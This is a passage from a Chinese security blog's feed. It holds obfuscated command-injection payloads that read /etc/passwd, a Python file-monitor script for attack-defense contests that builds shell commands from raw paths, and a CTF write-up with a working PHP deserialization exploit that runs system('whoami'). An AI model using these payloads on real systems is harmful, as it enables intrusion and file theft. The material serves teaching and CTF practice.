class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;a=/etc;b=/passwd;cat <span class="variable">$a</span><span class="variable">$b</span>;</span><br><span class="line">;cat<span class="variable">$IFS</span>/et?/pas??d;</span><br><span class="line">;c\a\t /e\t\c/p\a\s\s\wd;</span><br><span class="line">;ca<span class="variable">$&#123;xx&#125;</span>t /et<span class="variable">$&#123;xx&#125;</span>c/pas<span class="variable">$&#123;xx&#125;</span>swd;</span><br><span class="line">;<span class="variable">$&#123;SHELLOPTS:3:1&#125;</span>at /et<span class="variable">$&#123;SHELLOPTS:3:1&#125;</span>/passwd;</span><br><span class="line">;c(<span class="built_in">echo</span> a)t /et$(<span class="built_in">echo</span> c)/pas$(<span class="built_in">echo</span> s)wd;</span><br><span class="line">;c`<span class="built_in">echo</span> a`t /et`<span class="built_in">echo</span> c`/pas`<span class="built_in">echo</span> s`wd;</span><br><span class="line">;ca<span class="string">''</span>t /et<span class="string">''</span>c/pass<span class="string">''</span>wd;</span><br><span class="line">;ca<span class="string">""</span>t /et<span class="string">""</span>c/pass<span class="string">""</span>wd;</span><br><span class="line">;ca``t /et``c/pass``wd;</span><br></pre></td></tr></table></figure><h2 id="0x03-连接符"><a href="#0x03-连接符" class="headerlink" title="0x03 连接符"></a>0x03 连接符</h2><p>可用于进行命令注入利用和替换的连接符有：&amp;、&amp;&amp;、|、||、%0a、;、`、\n等。</p><p>注意前面几个符号的区别：&amp;&amp;号后面命令的执行是建立在前面命令已经正确执行的前提之下的；&amp;号表明这两条命令会同时执行，顺序先后不一定；管道符（|）能正常执行，但管道符的限制是只显示后面那条命令的执行结果；另外也有两个管道符（||）的用法，但是条件是前面的命令执行失败，和&amp;&amp;号的相反。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="命令注入" scheme="https://Mi1k7ea.github.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>AWD文件监控脚本</title>
    <link href="https://Mi1k7ea.github.com/2019/06/30/AWD%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7%E8%84%9A%E6%9C%AC/"/>
    <id>https://Mi1k7ea.github.com/2019/06/30/AWD文件监控脚本/</id>
    <published>2019-06-30T03:18:21.000Z</published>
    <updated>2019-06-30T03:40:12.964Z</updated>
    
    <content type="html"><![CDATA[<p>参考网上的脚本做了一些小的修改。</p><p>原理是利用pyinotify库实现文件监控，在EventHandler类的各个方法中调用一些自定义的方法来实现个人定制的文件监控功能，具体的可参考官方文档。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> WatchManager, Notifier,ProcessEvent</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> IN_DELETE, IN_CREATE, IN_MOVED_TO, IN_ATTRIB, IN_MODIFY</span><br><span class="line"></span><br><span class="line">dir_path = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventHandler</span><span class="params">(ProcessEvent)</span>:</span></span><br><span class="line"><span class="string">"""事件处理"""</span></span><br><span class="line"><span class="comment">#创建新文件，自动删除</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_IN_CREATE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[!] Create : "</span> + event.pathname</span><br><span class="line">DeleteFileOrDir(event.pathname)</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件被删除，如rm命令，自动恢复原文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_IN_DELETE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[!] Delete : "</span> + event.pathname</span><br><span class="line"><span class="comment"># CanNotDel(event.pathname)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#文件属性被修改，如chmod、chown命令</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_IN_ATTRIB</span><span class="params">(self, event)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[!] Attribute been modified:"</span> + event.pathname</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件被移来，如mv、cp命令，自动删除</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_IN_MOVED_TO</span><span class="params">(self, event)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[!] File or dir been moved to here: "</span> + event.pathname</span><br><span class="line">DeleteFileOrDir(event.pathname)</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件被修改，如vm、echo命令，自动恢复原文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_IN_MODIFY</span><span class="params">(self, event)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[!] Modify : "</span> + event.pathname</span><br><span class="line">CanNotModify(event.pathname)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteFileOrDir</span><span class="params">(target)</span>:</span></span><br><span class="line"><span class="keyword">if</span> os.path.isdir(target):</span><br><span class="line">fileslist = os.listdir(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.system(<span class="string">'cp '</span> + str(target) + <span class="string">' /tmp/evil_files/'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> files <span class="keyword">in</span> fileslist:</span><br><span class="line">DeleteFileOrDir(target + <span class="string">"/"</span> + files)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.rmdir(target)</span><br><span class="line"><span class="keyword">print</span> <span class="string">" &gt;&gt;&gt; Delete directory successfully: "</span> + target</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [-] Delete directory failed: "</span> + target</span><br><span class="line"><span class="keyword">if</span> os.path.isfile(target):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.system(<span class="string">'cp '</span> + str(target) + <span class="string">' /tmp/evil_files/'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.remove(target)</span><br><span class="line"><span class="keyword">print</span> <span class="string">" &gt;&gt;&gt; Delete file successfully"</span> + target</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [-] Delete file failed:  "</span> + target</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_md5</span><span class="params">(f)</span>:</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="comment">#如果不用二进制打开文件，则需要先编码</span></span><br><span class="line"><span class="comment">#data = f.read(1024).encode('utf-8')</span></span><br><span class="line">data = f.read(<span class="number">1024</span>)  <span class="comment">#将文件分块读取</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">m.update(data)</span><br><span class="line"><span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompareFile</span><span class="params">(file1, file2)</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(file1, <span class="string">'rb'</span>) <span class="keyword">as</span> f1, open(file2, <span class="string">'rb'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">file1_md5 = get_file_md5(f1)</span><br><span class="line">file2_md5 = get_file_md5(f2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file1_md5 != file2_md5:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CanNotModify</span><span class="params">(target)</span>:</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(target):</span><br><span class="line"><span class="keyword">if</span> os.path.isfile(target):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dir path: "</span> + dir_path</span><br><span class="line">target_new = <span class="string">"/tmp/backup/"</span> + str(target).split(dir_path)[<span class="number">1</span>]</span><br><span class="line">isChanged = CompareFile(str(target), target_new)</span><br><span class="line"><span class="keyword">if</span> isChanged:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.system(<span class="string">'cp '</span> + str(target) + <span class="string">' /tmp/evil_files/'</span>)</span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.system(<span class="string">"cat "</span> + target_new + <span class="string">" &gt; "</span> + str(target))</span><br><span class="line"><span class="keyword">print</span> <span class="string">" &gt;&gt;&gt; Recover file successfully"</span></span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [-] Recover file failed:  "</span> + target</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CanNotDel</span><span class="params">(target)</span>:</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">target_new = <span class="string">"/tmp/backup/"</span> + str(target).split(dir_path)[<span class="number">1</span>]</span><br><span class="line">os.system(<span class="string">"cat "</span> + target_new + <span class="string">" &gt; "</span> + str(target))</span><br><span class="line"><span class="keyword">print</span> <span class="string">" &gt;&gt;&gt; Recover file successfully"</span></span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [-] Recover file failed:  "</span> + target</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Monitor</span><span class="params">(path)</span>:</span></span><br><span class="line">wm = WatchManager()</span><br><span class="line">mask = IN_DELETE | IN_CREATE | IN_MOVED_TO | IN_ATTRIB | IN_MODIFY</span><br><span class="line">notifier = Notifier(wm, EventHandler())</span><br><span class="line">wm.add_watch(path, mask,rec=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Now Starting Monitor:  %s'</span>%(path)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">notifier.process_events()</span><br><span class="line"><span class="keyword">if</span> notifier.check_events():</span><br><span class="line">notifier.read_events()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">notifier.stop()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.system(<span class="string">'mkdir /tmp/evil_files/'</span>)</span><br><span class="line">os.system(<span class="string">'mkdir /tmp/backup/'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Oh.'</span></span><br><span class="line">parser = argparse.ArgumentParser(</span><br><span class="line">usage=<span class="string">"%(prog)s -w [path]"</span>,</span><br><span class="line">description=(<span class="string">'''</span></span><br><span class="line"><span class="string">Introduce：Simple Directory Monitor!  by ssooking'''</span>)</span><br><span class="line">)</span><br><span class="line">parser.add_argument(<span class="string">'-w'</span>,<span class="string">'--watch'</span>,action=<span class="string">"store"</span>,dest=<span class="string">"path"</span>,default=<span class="string">"/var/www/html/"</span>,help=<span class="string">"directory to watch,default is /var/www/html"</span>)</span><br><span class="line">args=parser.parse_args()</span><br><span class="line">dir_path = str(args.path)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dir path: "</span> + dir_path</span><br><span class="line">cmd = <span class="string">'cp -r '</span> + str(args.path)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dir path: "</span> + dir_path</span><br><span class="line">cmd = <span class="string">'cp -r '</span> + str(args.path) + <span class="string">'* /tmp/backup/'</span></span><br><span class="line">os.system(cmd)</span><br><span class="line">Monitor(args.path)</span><br></pre></td></tr></table></figure><p>代码的功能应该一目了然。</p><p>有个问题，AWD实际情况中未必有pyinotify这个库或者根本没有Python环境，一种解决方案是自己准备好Python和pyinotify库的源码安装包。</p><p>除此之外，我们可以将Python文件提前编译成32位和64位的ELF文件，即到即用就OK了。</p><p>这里用到一个名为pyinstaller的库，安装很简单：pip install pyinstaller</p><p>使用也很简单：pyinstaller -F ./Monitor.py</p><p>编译完成后，在dist子目录中可以找到目标可执行文件。</p><p><strong>注意：pyinstaller在不用系统环境编译出来的可执行文件是存在区别，在Windows上编译生成的是EXE文件，在Linux上编译生成的是ELF文件，而在32位系统才会生成32位可执行文件、在64位系统生成64位可执行文件。</strong></p><p><img src="/2019/06/30/AWD文件监控脚本/1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/categories/Python/"/>
    
    
      <category term="安全开发" scheme="https://Mi1k7ea.github.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="AWD" scheme="https://Mi1k7ea.github.com/tags/AWD/"/>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>一道Bypass正则过滤的反序列化漏洞题目</title>
    <link href="https://Mi1k7ea.github.com/2019/06/27/%E4%B8%80%E9%81%93Bypass%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE/"/>
    <id>https://Mi1k7ea.github.com/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/</id>
    <published>2019-06-27T15:08:15.000Z</published>
    <updated>2019-06-30T03:12:46.556Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>一道PHP代码审计的题目，直接看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">            &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        call_user_func($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">new</span> Template($_POST[<span class="string">'data'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>__construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p><p>__destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p><strong>反序列化漏洞调用链分析</strong></p><p>考察点是原生的PHP unserialize反序列化漏洞。Template类有两个成员变量cacheFile和template，构造方法__construct()中调用了loadData()和render()，而析构方法__destruct()则调用了createCache()；其中，loadData()是通过if判断对参数进行过滤、再调用unserialize()方法反序列化参数内容，render()是在界面输出参数的name对应的值，createCache()中以Template类的两个成员变量为参数调用call_user_func()；很明显，漏洞点在于call_user_func()函数的任意函数调用，其代码逻辑在createCache()中，而createCache()函数是在析构函数__destruct()中调用，而在代码的最后是通过POST请求传入data参数来构造新的Template类实例，当所有代码执行完之后析构函数__destruct()必然会被调用；也就是说，data参数可控，可以通过构造方法调用到unserialize()方法中实现对data内容的反序列化操作，最终在代码执行完成时通过析构函数实现任意函数调用，那么反序列化利用的逻辑就理清了。</p><p><strong>Bypass</strong></p><p>我们看到在loadData()中是通过if判断对参数进行过滤、再调用unserialize()方法反序列化参数内容。要想进入反序列化的逻辑，必须通过下面的if判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data))</span><br></pre></td></tr></table></figure><p>第一个判断条件是开头前两个字符不能为’O:’开始，第二个判断条件是正则表达式不能匹配到’O:’后面加数字这样的情况。</p><p>我们知道，正常序列化的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;SKI12&quot;;s:4:&quot;blog&quot;;s:28:&quot;https://blog.csdn.net/ski_12&quot;;&#125;</span><br></pre></td></tr></table></figure><p>PHP中可反序列化类型有String、Integer、Boolean、Null、Array、Object等，这里看来Object是行不通了。再结合代码看下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">        htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在render()函数中调用了传入参数data的name对应的值，调用方式为$data[‘name’]，表明data是个数组，间接提示我们可以采用数组中存储对象进行绕过。</p><p>至于第二个判断条件的Bypass，这里直接借鉴参考的文章。</p><blockquote><p>第二个if判断,匹配 字符串为 \’O:任意十进制:’,将对象放入数组进行反序列化后，仍然能够匹配到，返回为空，考虑一下如何绕过正则匹配，PHP反序列化处理部分源码如下：</p></blockquote><p><img src="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/1.png" alt=""></p><p><img src="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/2.png" alt=""></p><p><img src="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/3.png" alt=""></p><blockquote><p>在PHP源码var_unserializer.c，对反序列化字符串进行处理，在代码568行对字符进行判断，并调用相应的函数进行处理，当字符为’O’时，调用 <strong>yy13</strong> 函数，在 <strong>yy13</strong> 函数中，对‘O‘字符的下一个字符进行判断，如果是’:’,则调用 <strong>yy17</strong> 函数,如果不是则调用 <strong>yy3</strong> 函数,直接return 0，结束反序列化。接着看 <strong>yy17</strong> 函数。通过观察yybm[]数组可知，第一个if判断是否为数字，如果为数字则跳转到 <strong>yy20</strong> 函数，第二个判断如果是’+’号则跳转到 <strong>yy19</strong> ，在 <strong>yy19</strong> 中，继续对 <strong>+号</strong> 后面的字符进行判断，如果为数字则跳转到 <strong>yy20</strong> ,如果不是则跳转到 <strong>yy18</strong> ， <strong>y18</strong> 最终跳转到 <strong>yy3</strong> ，退出反序列化流程。由此，在’O:’,后面可以增加’+’，用来绕过正则判断。</p></blockquote><p><strong>利用思路</strong></p><ul><li>构造序列化内容，将两个成员变量分别初始化为恶意函数和参数，这里设置为assert和system(‘ls’)；</li><li>在恶意构造的序列化内容中的’O:’后面加上+号；</li><li>通过POST将序列化内容传递给data参数来触发反序列化漏洞；</li></ul><p><strong>Exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'assert'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'system(\'whoami\');'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">array</span>(<span class="keyword">new</span> Template()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;O:8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:6:&quot;assert&quot;;s:8:&quot;template&quot;;s:17:&quot;system(&apos;whoami&apos;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>在’O:’后面加上+号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:6:&quot;assert&quot;;s:8:&quot;template&quot;;s:17:&quot;system(&apos;whoami&apos;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>触发利用：</p><p><img src="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/4.png" alt=""></p><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a href="https://mochazz.github.io/2018/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day11%20-%20unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">代码审计Day11 - unserialize反序列化漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>从一道CTF题看如何通过本地DTD文件利用XXE实现回显</title>
    <link href="https://Mi1k7ea.github.com/2019/06/27/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9C%8B%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0XXE%E6%94%BB%E5%87%BB/"/>
    <id>https://Mi1k7ea.github.com/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/</id>
    <published>2019-06-27T14:14:57.000Z</published>
    <updated>2019-06-27T15:02:32.356Z</updated>
    
